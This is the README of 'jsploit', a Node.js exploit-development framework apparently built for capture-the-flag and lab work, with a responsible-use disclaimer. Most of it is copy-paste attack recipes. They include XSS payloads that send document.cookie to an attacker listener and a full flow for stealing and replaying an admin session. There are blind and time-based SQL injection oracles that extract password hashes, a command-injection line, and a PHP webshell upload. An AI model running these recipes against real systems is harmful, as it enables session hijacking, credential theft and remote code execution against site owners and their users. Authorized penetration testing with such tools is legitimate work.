# jsploit

**Exploit Development Framework for Node.js**

A exploit development framework with session management, automatic cookie handling, HTML parsing, a payload/callback listener, LHOST discovery, and parallel blind extraction. Similar to Python's `requests.Session` but built entirely with native Node.js modules — **zero external dependencies**.

## Features

- **Session Management** - Persistent cookies across requests (like `requests.Session`)
- **`requests` parity** - `params`, `data`/`json`, `files`, `verify`, `proxies`, per-request redirect toggle, one-line cookie setter
- **HTML Parsing** - Extract CSRF tokens, forms, links, and more
- **Payload Server + Hit Capture** - Serve `payload.js`/beacons and `await` the callback (XSS → cookie)
- **LHOST Discovery** - Auto-find the VPN (`tun0`) IP the victim must call back to
- **Blind Extraction** - Parallel character-by-character exfiltration (linear/binary × boolean/time)
- **SSL Bypass** - Ignore SSL certificate errors (`verify: false`)
- **Proxy Support** - Route traffic through Burp Suite or other proxies
- **Zero Dependencies** - Uses only Node.js internal modules; bundles to one file with esbuild

## Responsible Use

This project is intended for **authorized security testing** and educational purposes. Only use it on systems you own or have explicit permission to test. You are responsible for complying with applicable laws and regulations.

## Table of Contents

- [Installation](#installation)
- [Quick Start](#quick-start)
- [1. Session basics](#1-session-basics) — the essential snippets
- [2. Reusable patterns](#2-reusable-patterns) — copy-paste recipes
  - [Serve a payload](#serve-a-payload)
  - [Steal a cookie via XSS](#steal-a-cookie-via-xss)
  - [Blind extraction](#blind-extraction)
- [3. Speed tips](#3-speed-tips) — how to move fast under pressure
- [jsploit ↔ requests](#jsploit--requests) — side-by-side mapping
- [Canonical flows](#canonical-flows) — end-to-end recipes
  - [Flow 1 — XSS → cookie theft](#flow-1--xss--cookie-theft)
  - [Flow 2 — Blind SQL injection](#flow-2--blind-sql-injection)
  - [Flow 3 — RCE (in-band and webshell)](#flow-3--rce-in-band-and-webshell)
- [API Reference](#api-reference)
  - [Session](#session)
  - [Response object](#response-object)
  - [HTML parser](#html-parser)
  - [PayloadServer](#payloadserver)
  - [getLHOST](#getlhost)
  - [extractBlind](#extractblind)
  - [Logger](#logger)
  - [Error classes](#error-classes)
- [Creating exploits](#creating-exploits)
- [Packaging for delivery](#packaging-for-delivery)
- [Troubleshooting](#troubleshooting)
- [CLI Options](#cli-options)
- [Exit Codes](#exit-codes)
- [License](#license)

## Installation

```bash
# Install globally (CLI)
npm i -g @n00bcyb0t/jsploit
jsploit -h

# Recommended: install per-project (so generated exploits can `import '@n00bcyb0t/jsploit'`)
npm i @n00bcyb0t/jsploit
npx jsploit -h
```

Subpath imports are available if you want just one capability:

```javascript
import { Session }               from '@n00bcyb0t/jsploit';          // everything
import { Session }               from '@n00bcyb0t/jsploit/http';     // HTTP only
import { PayloadServer, getLHOST } from '@n00bcyb0t/jsploit/listener'; // listener only
import { extractBlind }          from '@n00bcyb0t/jsploit/blind';    // blind only
```

## Quick Start

```bash
# CLI
jsploit new sql-injection                       # → ./exploits/sql-injection.js
jsploit run sql-injection -t http://target.com
jsploit run sql-injection -t http://target.com -x 127.0.0.1:8080  # via Burp
jsploit list
```

```javascript
// Programmatic
import { Session, parse, logger } from '@n00bcyb0t/jsploit';

const session = new Session({ baseUrl: 'http://target.com', verify: false });

const res = await session.get('/login');
console.log(res.status);                 // 200

const csrf = parse(res.body).findCSRFToken();
console.log(csrf);                       // { name: '_token', value: 'abc123' }

const login = await session.post('/login', {
    form: { username: 'admin', password: "' OR '1'='1", _token: csrf?.value },
});
console.log(session.getCookies());       // { PHPSESSID: '...' } — cookies auto-managed
```

---

## 1. Session basics

The `Session` is the workhorse — one object that carries cookies, headers, and settings across every request, exactly like `requests.Session`.

```javascript
import { Session } from '@n00bcyb0t/jsploit';

const s = new Session({ baseUrl: 'http://target.com', verify: false });

// GET with a query string (params → ?a=1&b=2)
const r1 = await s.get('/search', { params: { q: 'admin', page: 2 } });
// hits /search?q=admin&page=2

// POST url-encoded form data
const r2 = await s.post('/login', { form: { user: 'admin', pass: 'admin' } });
// Content-Type: application/x-www-form-urlencoded

// POST JSON (an object body is JSON-encoded automatically)
const r3 = await s.post('/api/users', { body: { name: 'x', role: 'admin' } });
// Content-Type: application/json

// Multipart file upload
const r4 = await s.post('/upload', { formData: { note: 'hi' }, files: { avatar: '/tmp/a.png' } });

// Hardcode an authenticated cookie during development (one line)
s.setCookie('PHPSESSID', 'deadbeefcafe');
await s.get('/admin');                   // cookie is sent automatically

// Inspect a redirect instead of following it (per-request)
const r5 = await s.get('/redir', { followRedirects: false });
console.log(r5.status, r5.getLocation()); // 302 /login
```

Every response is a plain object with helpers:

```javascript
const res = await s.get('/page');
res.ok            // true if 2xx
res.status        // 200
res.body          // response body (string)
res.getHeader('content-type');
res.json();       // parse body as JSON
```

## 2. Reusable patterns

Ready-to-paste building blocks. Each is self-contained and prints its result.

### Serve a payload

Serve `payload.js` (or any file/beacon) to a victim over the VPN. Placeholders like `{{LHOST}}` are substituted before serving, so the payload phones home to the right address:

```javascript
import { PayloadServer, getLHOST } from '@n00bcyb0t/jsploit';

const LHOST = getLHOST({ iface: 'tun' });   // e.g. '10.10.14.5' from tun0
const server = new PayloadServer({ vars: { LHOST } });

server.route('/payload.js', {
    contentType: 'js',                       // → application/javascript (runs in the browser)
    body: 'fetch("http://{{LHOST}}:{{LPORT}}/?cookie=" + btoa(document.cookie))',
});

const { url } = await server.start();
console.log(`Serving: ${url}/payload.js`);   // Serving: http://10.10.14.5:PORT/payload.js
// ... trigger the payload, then stop when done:
// await server.stop();
```

> **Tip:** use `.replace()`-style placeholders (`{{LHOST}}`), never JS template literals, in payloads that contain `{}` (SSTI/SSJI) — the double-brace syntax never collides with a `{7*7}` payload.

### Steal a cookie via XSS

The same server captures the callback. `waitForHit()` resolves the moment the beacon lands (and buffers it if it arrives first):

```javascript
import { PayloadServer, getLHOST, Session } from '@n00bcyb0t/jsploit';

const LHOST = getLHOST({ iface: 'tun' });
const server = new PayloadServer({ vars: { LHOST } });
server.route('/x.js', { contentType: 'js',
    body: 'new Image().src="http://{{LHOST}}:{{LPORT}}/?c="+btoa(document.cookie)' });
await server.start();

// Fire the XSS that loads http://LHOST:PORT/x.js (via your Session), then:
const hit = await server.waitForHit({ timeout: 60000 });
const cookies = hit.decoded('base64');       // stolen cookie usually arrives url-safe-base64
console.log('Stolen:', cookies);             // Stolen: PHPSESSID=s3cr3t; role=admin

// Reuse it to reach a privileged area
const victim = new Session({ baseUrl: 'http://target.com' });
victim.setCookie('PHPSESSID', cookies.match(/PHPSESSID=([^;]+)/)[1]);
const admin = await victim.get('/admin');
console.log(admin.status);                   // 200
await server.stop();
```

### Blind extraction

Provide the **oracle** (the function that does the injection and decides true/false); the library owns the loop, the parallelism, and the assembly:

```javascript
import { Session, extractBlind } from '@n00bcyb0t/jsploit';

const s = new Session({ baseUrl: 'http://target.com', verify: false });

// oracle: is the char at `position` equal to `guess`? (1-based, like SQL SUBSTRING)
const oracle = async (position, guess) => {
    const payload = `1 AND SUBSTRING((SELECT password FROM users WHERE id=1),${position},1)='${guess}'`;
    const res = await s.get('/item', { params: { id: payload } });
    return res.body.includes('EXISTS');       // truth marker in the response
};

const hash = await extractBlind({ oracle, length: 32, concurrency: 20 });
console.log(hash);                            // 5f4dcc3b5aa765d61d8327deb882cf99
```

Switch to `strategy: 'binary'` with a greater-than oracle to cut requests from O(n) to O(log n) per character — see [extractBlind](#extractblind).

## 3. Speed tips

The difference between a slow exploit and a fast one under time pressure:

- **Sanity-check with an assertion.** Fail loud and early — a wrong base URL or a missing truth-marker should throw, not silently extract garbage.
  ```javascript
  const probe = await s.get('/');
  if (!probe.ok) throw new Error(`Target down: ${probe.status}`);
  ```
- **Print `[+]`/`[=]` per step.** Use the `logger` so you can see where a run stalls. `extractBlind` already streams `[=]` progress char-by-char.
- **One global `Session`.** Reuse cookies and headers; don't re-authenticate per request.
- **A global `BASE_URL`.** One constant at the top; the runner edits one line.
- **Hardcode a cookie during development.** Grab a valid session from your browser and `s.setCookie('PHPSESSID', '...')` so you skip login while iterating.
- **Use `.replace()`, not template literals, for payloads with `{}`.** SSTI/SSJI payloads (`{{7*7}}`, `${...}`) break f-string-style interpolation — substitute `{{LHOST}}`-style placeholders instead.
- **Auto-discover LHOST.** `getLHOST({ forTarget })` picks the right outbound interface so you never announce `127.0.0.1` to a remote target.

---

## jsploit ↔ requests

If you know Python's `requests`, you already know jsploit:

| Python `requests` | jsploit |
| --- | --- |
| `requests.Session()` | `new Session()` |
| `session.get(url, params={'a': 1})` | `session.get(url, { params: { a: 1 } })` |
| `session.post(url, data={'k': 'v'})` | `session.post(url, { form: { k: 'v' } })` |
| `session.post(url, json={'k': 'v'})` | `session.post(url, { body: { k: 'v' } })` |
| `session.post(url, files={'f': open(p,'rb')})` | `session.post(url, { files: { f: p } })` |
| `verify=False` | `new Session({ verify: false })` (default) |
| `proxies={'http': 'http://127.0.0.1:8080'}` | `new Session({ proxy: { host: '127.0.0.1', port: 8080 } })` |
| `allow_redirects=False` | `session.get(url, { followRedirects: false })` |
| `session.cookies.set('k', 'v')` | `session.setCookie('k', 'v')` |
| global `s = requests.Session()` | `export const s = new Session({ baseUrl: BASE_URL })` |
| `r.status_code` / `r.text` / `r.json()` | `r.status` / `r.body` / `r.json()` |

---

## Canonical flows

Three complete, copy-paste recipes.

### Flow 1 — XSS → cookie theft

`getLHOST` → serve `payload.js` → fire the XSS → `await waitForHit()` → reuse the stolen cookie.

```javascript
import { PayloadServer, getLHOST, Session, logger } from '@n00bcyb0t/jsploit';

const BASE_URL = 'http://target.com';

async function main() {
    // 1. Where should the victim call back?
    const LHOST = getLHOST({ iface: 'tun' });        // '10.10.14.5'
    logger.info(`LHOST: ${LHOST}`);

    // 2. Serve the exfil payload
    const server = new PayloadServer({ vars: { LHOST } });
    server.route('/p.js', { contentType: 'js',
        body: 'new Image().src="http://{{LHOST}}:{{LPORT}}/?cookie="+btoa(document.cookie)' });
    const { url } = await server.start();
    logger.success(`Payload at ${url}/p.js`);

    // 3. Inject the XSS that loads our script (stored/reflected)
    const attacker = new Session({ baseUrl: BASE_URL, verify: false });
    await attacker.post('/comment', {
        form: { body: `<script src="${url}/p.js"></script>` },
    });

    // 4. Block until the admin's browser fires the beacon
    logger.info('Waiting for a hit...');
    const hit = await server.waitForHit({ timeout: 120000 });
    const cookie = hit.decoded('base64');
    logger.found('Stolen cookie', cookie);           // PHPSESSID=s3cr3t; ...

    // 5. Ride the session into the admin area
    const victim = new Session({ baseUrl: BASE_URL, verify: false });
    victim.setCookie('PHPSESSID', cookie.match(/PHPSESSID=([^;]+)/)[1]);
    const admin = await victim.get('/admin');
    logger.success(`Admin: ${admin.status}`);        // Admin: 200

    await server.stop();
    return { success: admin.ok };
}
main();
```

### Flow 2 — Blind SQL injection

`extractBlind` reconstructs the admin hash in parallel; the `oracle` does the injection.

```javascript
import { Session, extractBlind, logger } from '@n00bcyb0t/jsploit';

const s = new Session({ baseUrl: 'http://target.com', verify: false });

// Greater-than comparison oracle → enables O(log n) binary search per char
const oracle = async (position, guess) => {
    const g = guess.charCodeAt(0);
    const payload = `1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),${position},1))>${g}-- -`;
    const res = await s.get('/product', { params: { id: payload } });
    return res.body.includes('In stock');            // truth marker
};

const hash = await extractBlind({
    oracle,
    length: 32,
    strategy: 'binary',      // binary search: ~7 requests/char instead of ~95
    concurrency: 20,         // 20 positions in flight at once
});
logger.success(`admin hash: ${hash}`);               // 5f4dcc3b5aa765d61d8327deb882cf99
// → crack offline, or use to authenticate/escalate
```

Time-based variant (no truth marker in the body — the DB just sleeps):

```javascript
const timeOracle = async (position, guess) => {
    const g = guess.charCodeAt(0);
    const payload = `1 AND IF(ASCII(SUBSTRING(database(),${position},1))>${g},SLEEP(2),0)-- -`;
    const t0 = Date.now();
    await s.get('/product', { params: { id: payload } });
    return Date.now() - t0;                           // return the response time (ms)
};

const db = await extractBlind({
    timeOracle, length: 8, strategy: 'binary', mode: 'time', delayThreshold: 1500,
});
```

### Flow 3 — RCE (in-band and webshell)

**Path A — in-band** (the injection returns output in the response):

```javascript
const res = await s.get('/ping', { params: { host: '127.0.0.1; cat /flag' } });
const flag = res.body.match(/flag\{[^}]+\}/)?.[0];
logger.found('flag', flag);
```

**Path B — webshell** (write a shell, then drive it with `params`):

```javascript
// 1. Drop a webshell via the file-write primitive (upload, LFI→log, etc.)
await s.post('/upload', { files: { f: '/tmp/shell.php' } });   // <?php system($_GET['cmd']);

// 2. Run commands through it — params maps straight to the query string
const out = await s.get('/uploads/shell.php', { params: { cmd: 'cat /flag' } });
logger.found('flag', out.body.trim());
```

---

## API Reference

### Session

```javascript
import { Session } from '@n00bcyb0t/jsploit';

const session = new Session({
    baseUrl: 'http://target.com',
    verify: false,              // Ignore SSL errors (default)
    followRedirects: true,      // Follow redirects (default)
    maxRedirects: 10,           // Maximum redirects
    timeout: 30000,             // Request timeout (ms)
    headers: { 'User-Agent': 'Mozilla/5.0' },
    proxy: { host: '127.0.0.1', port: 8080 },
});

// HTTP methods
await session.get(url, options);
await session.post(url, options);
await session.put(url, options);
await session.delete(url, options);
await session.patch(url, options);
await session.head(url, options);
await session.options(url, options);

// Request options
await session.request('POST', '/api', {
    params: { a: 1, b: 2 },             // Query string (merged with any in the URL)
    body: 'raw body' | { k: 'v' },      // Raw body; an object → JSON
    form: { key: 'value' },             // URL-encoded form data
    formData: { key: 'value' },         // Multipart form data
    files: { field: '/path/to/file' },  // File uploads (multipart)
    headers: { 'X-Custom': 'value' },   // Additional headers
    followRedirects: false,             // Per-request redirect toggle
    verify: false,                      // Per-request SSL toggle
    timeout: 5000,                      // Override timeout
});

// Cookies
session.setCookie('PHPSESSID', 'abc', { domain, path, secure }); // one-line setter
session.getCookies();           // { name: value, ... }
session.clearCookies();
session.saveCookies('jar.txt'); // Netscape cookie jar
session.loadCookies('jar.txt');

// Proxy
session.setProxy('127.0.0.1', 8080);
session.clearProxy();
```

### Response object

```javascript
const res = await session.get('/page');

res.ok              // true if 2xx status
res.status          // 200
res.statusText      // 'OK'
res.headers         // { 'content-type': 'text/html', ... } (lowercase keys)
res.body            // Response body as string
res.cookies         // ['session=abc123; Path=/']
res.url             // Final URL (after redirects)
res.history         // Redirect history

res.isSuccess()     // 2xx    res.isRedirect()    // 3xx
res.isClientError() // 4xx    res.isServerError() // 5xx
res.getHeader(name) res.getLocation()
res.json()          res.text()
```

### HTML parser

```javascript
import { parse } from '@n00bcyb0t/jsploit';
const html = parse(responseBody);

html.title  html.forms  html.links  html.inputs  html.metas  html.scripts

html.findCSRFToken()    // { name, value } or null
html.getForm(0)         // form by index
html.findForm('login')  // by action/id/name

const form = html.getForm(0);
form.action  form.method  form.inputs  form.getData()  form.getInput('name')

html.findLinks('admin')       // links matching a pattern
html.getText('h1')            // text from tags
html.findById('id')  html.findByClass('cls')
html.extractJSON('var')       // JSON out of a <script>
html.getMeta('csrf-token')
```

### PayloadServer

A single HTTP server that **serves payloads** (routes) and **captures callbacks** (any unrouted request). Extends `EventEmitter`.

```javascript
import { PayloadServer, GIF_1x1 } from '@n00bcyb0t/jsploit';

const server = new PayloadServer({
    host: '0.0.0.0',          // default — reachable from the victim (never 127.0.0.1)
    port: 0,                  // 0 = OS-assigned free port; or pass an explicit port
    vars: { LHOST: '10.10.14.5' },  // placeholders for {{LHOST}}/{{LPORT}}/{{COLLECTOR}}
    callback: { status: 200, body: '', contentType: 'text/plain' }, // response to captured hits
});

// Serve routes. body is a string (placeholders substituted) or a Buffer;
// `file` is read from disk on demand; contentType accepts a MIME type or a
// shorthand (js/html/gif/json/css/png). It's inferred from the path otherwise.
server.route('/payload.js', { contentType: 'js', body: 'alert(1)' });
server.route('/stage', { file: './stage.bin', contentType: 'application/octet-stream' });
server.route('/b.gif', { body: GIF_1x1, contentType: 'gif' });   // 1×1 <img> beacon

const { host, port, url } = await server.start();   // resolves once listening

// Wait for the callback (buffers a hit that arrives before you call this)
const hit = await server.waitForHit({ timeout: 60000, predicate: h => 'cookie' in h.query });

// CapturedRequest
hit.method         // 'GET'
hit.path           // '/'
hit.query          // { cookie: '...' } — parsed query string
hit.headers        // request headers (lowercase keys)
hit.bodyRaw        // raw body string
hit.body           // parsed body (object for form/JSON)
hit.remoteAddress  // client IP
hit.timestamp      // ms since epoch
hit.decoded('base64');       // decode the exfiltrated value (accepts url-safe base64)
hit.decoded('url');          // url-decode
hit.decoded('base64', 'c');  // decode a specific query param

server.getHits();  // all captured callbacks (evidence)
await server.stop();           // idempotent; frees the port for the next run

// Events: 'request' (every request), 'hit' (a captured callback), 'error'
server.on('hit', h => console.log('hit!', h.query));
```

- Requests to a **defined route** are *served* (they fire `'request'` but are not "hits"), so a bare `waitForHit()` ignores the victim fetching `payload.js` and resolves on the actual callback.
- Requests to **any other path** are *captured*: added to `getHits()`, emit `'hit'`, and resolve `waitForHit()`.

### getLHOST

Find the local IPv4 the target should call back to (the VPN address, not loopback).

```javascript
import { getLHOST, getLHOSTAsync } from '@n00bcyb0t/jsploit';

getLHOST();                          // first non-internal IPv4 (tun/tap preferred)
getLHOST({ iface: 'tun' });          // first IPv4 on an interface named like *tun* → tun0
getLHOST({ forTarget: '10.10.10.5' }); // ask the OS which interface routes to the target

// Async variant waits for route selection on platforms where it's async
await getLHOSTAsync({ forTarget: '10.10.10.5' });
```

- `forTarget` is the most robust: it opens a "connected" UDP socket toward the target (no packet sent) and reads the local address the OS picked for that route.
- Throws a `ValidationError` if no suitable address is found (e.g. VPN down), and warns before ever returning a loopback address for a remote target.

### extractBlind

Reconstruct an unknown string character-by-character through your oracle. One engine, four modes (`strategy` × `mode`); only the oracle's decision changes.

```javascript
import { extractBlind } from '@n00bcyb0t/jsploit';

const secret = await extractBlind({
    // boolean modes: your oracle returns true/false
    oracle: async (position, guess) => { /* inject, return boolean */ },
    // time mode: return the response time in ms (or omit and pass `oracle` to auto-measure)
    timeOracle: async (position, guess) => { /* inject, return ms */ },
    lengthOracle: async (n) => { /* is the string length >= n? */ },  // optional

    length: 32,                 // known length; omit to auto-discover
    charset: undefined,         // default: printable ASCII 32..126
    concurrency: 20,            // max concurrent oracle calls (default 20)
    strategy: 'linear',         // 'linear' (equality) | 'binary' (greater-than)
    mode: 'boolean',            // 'boolean' | 'time'
    delayThreshold: 1000,       // ms cutoff for time mode
    retries: 3,                 // per-call retries on network error
    onProgress: (partial) => {},// called as the known prefix grows
});
```

Oracle contract by strategy:

- **linear** — `oracle(position, guess)` answers **equality**: "is the char at `position` equal to `guess`?" The engine scans the charset. If no char matches a position, that marks end-of-string (used for auto-length discovery).
- **binary** — `oracle(position, guess)` answers **greater-than**: "is the char at `position` greater than `guess`?" The engine binary-searches the sorted charset — ~`log2(charset)` requests per character instead of the full scan.

Length is `length` when known; otherwise auto-discovered via `lengthOracle` (any strategy) or via the no-match terminator (linear only). `mode: 'time'` swaps the boolean decision for a timing measurement against `delayThreshold` and works with **both** strategies. Positions are **1-based** (matching SQL `SUBSTRING`). Progress streams as `[=]` lines.

### Logger

```javascript
import { logger } from '@n00bcyb0t/jsploit';

logger.info('Information');     // [*] Information
logger.success('Success');      // [+] Success
logger.warning('Warning');      // [!] Warning
logger.error('Error');          // [x] Error
logger.debug('Debug info');     // [DEBUG] Debug info

logger.step(1, 'First step');   // [1] First step
logger.request('POST', '/api'); // [>] POST /api
logger.response(200, 'OK');     // [<] 200 OK
logger.found('CSRF', 'token');  // [✓] CSRF: token
logger.title('Title');  logger.separator();  logger.box('Important!', 'green');
```

### Error classes

```javascript
import {
    ValidationError, ConnectionError, HttpError,
    TimeoutError, ParseError, ExploitError, ListenerError,
} from '@n00bcyb0t/jsploit';

try {
    await session.get('/page');
} catch (err) {
    if (err instanceof ConnectionError) { /* network error */ }
    if (err instanceof TimeoutError)    { /* request/hit timeout */ }
    if (err instanceof HttpError)       { console.log(err.statusCode); }
    if (err instanceof ListenerError)   { /* bind failed / server stopped while waiting */ }
}
```

## Creating exploits

```javascript
// exploits/my-exploit.js
import { Session, parse, logger } from '@n00bcyb0t/jsploit';

export const metadata = { name: 'my-exploit', description: '...', version: '1.0.0' };

export async function exploit(options = {}) {
    const { target, proxy, verbose, timeout = 30000, verify = false } = options;
    const session = new Session({ baseUrl: target, verify, timeout, proxy });

    // ... your exploit logic ...

    return { success: true, data: { /* extracted */ } };
}
```

```bash
jsploit run my-exploit -t http://target.com
jsploit run my-exploit -t http://target.com -x 127.0.0.1:8080   # via Burp
jsploit run my-exploit -t http://target.com --dir ./pocs
node exploits/my-exploit.js http://target.com                   # direct execution
```

`jsploit new <name>` scaffolds a fully-commented template covering session + cookies, HTML parsing, a multi-step flow, and result reporting.

## Packaging for delivery

When you need to **hand an exploit to someone who will just run it**, depending on `jsploit` (or any library) is fine — every ecosystem does it (Python's `requests`, `beautifulsoup4`, and so on). Rewriting a parser, a cookie jar, or deserialization logic by hand just to avoid a dependency doesn't scale and isn't worth it. **Keep the dependency.**

If the runner has npm and network access, a plain `npm i @n00bcyb0t/jsploit` next to the script (see [Installation](#installation)) is all it takes.

### Bundle into one file (offline / zero-setup)

When the runner may be **offline** or you want a true one-file drop, bundle the exploit with [esbuild](https://esbuild.github.io/). `jsploit` — HTTP client, parser, cookies, listener, blind engine — gets inlined into a single `.mjs` that needs no `npm install`:

```bash
npx esbuild path/to/exploit.js \
  --bundle --platform=node --format=esm \
  --outfile=exploit-standalone.mjs

node exploit-standalone.mjs
```

You develop with the full framework and ship one self-contained file.

### Checklist for a good delivery script

- **Config block at the top** (`BASE_URL`, and any `LHOST`/`LPORT`/paths), with `process.argv` overrides — the runner edits a couple of lines or passes args.
- **No manual interaction** — the full chain runs start to finish on its own.
- **Prints evidence** (leaked file, command output, status) so success is visible.
- **Meaningful exit codes** (`0` success, non-zero for each failure mode).
- **SSL bypass** built in, so self-signed / lab certs don't block it.

## Troubleshooting

**Route traffic through Burp Suite.** Point the session at Burp and disable SSL verification:

```javascript
const s = new Session({ baseUrl: BASE_URL, verify: false, proxy: { host: '127.0.0.1', port: 8080 } });
// or, dynamically:
s.setProxy('127.0.0.1', 8080);
```

**Print the raw request.** Turn on debug logging to see method/URL/headers, or reach the low-level builder to inspect the exact bytes on the wire:

```javascript
import { setLogLevel, LOG_LEVELS } from '@n00bcyb0t/jsploit';
setLogLevel(LOG_LEVELS.DEBUG);   // logs [>] METHOD url per request

import { buildRequest } from '@n00bcyb0t/jsploit/http';
const raw = buildRequest({ method: 'POST', host: 'target.com', path: '/login',
    formData: { u: 'admin' } });
console.log(raw.toString());     // the literal HTTP request bytes
```

**The payload calls back to the wrong IP.** You almost certainly announced a LAN/loopback address. Use `getLHOST({ iface: 'tun' })` or `getLHOST({ forTarget })`, and bind the `PayloadServer` to `0.0.0.0` (the default) so the victim on the VPN can reach it.

**Watch the callback on the wire.** Filter your VPN interface in Wireshark/tcpdump while you wait for a hit:

```bash
# tcpdump on the VPN interface, only traffic to your listener port
sudo tcpdump -i tun0 -n 'tcp port 8000'
# Wireshark display filter:  ip.addr == 10.10.14.5 && tcp.port == 8000
```

**`waitForHit` times out.** Confirm the server is reachable from the target (`curl http://LHOST:PORT/` from a foothold), check the payload actually executes, and remember a hit that lands *before* you call `waitForHit()` is buffered and still delivered.

## CLI Options

```
COMMANDS:
  new <name>        Create a new exploit from template
  run <name>        Run an exploit
  list              List available exploits

OPTIONS:
  -t, --target      Target URL for the exploit
  --dir             Exploit directory (default: ./exploits)
  -x, --proxy       Proxy to use (host:port)
  --timeout         Request timeout in ms [30000]
  --verify          Verify SSL certificates
  -v, --verbose     Verbose output
  -d, --debug       Debug mode (show stack traces)

OUTPUT:
  -o, --output      Output file for results
  -s, --silent      Suppress all output except results
  --no-color        Disable colored output

INFO:
  -h, --help        Show help message
  -V, --version     Show version number
```

## Exit Codes

| Code | Description |
|------|-------------|
| 0 | Success |
| 1 | Validation error |
| 2 | Connection error |
| 3 | HTTP error |
| 4 | Timeout error |
| 5 | Parse error |
| 6 | Exploit error |
| 7 | Listener error |
| 99 | Unknown error |

## License

MIT. See `LICENSE`.
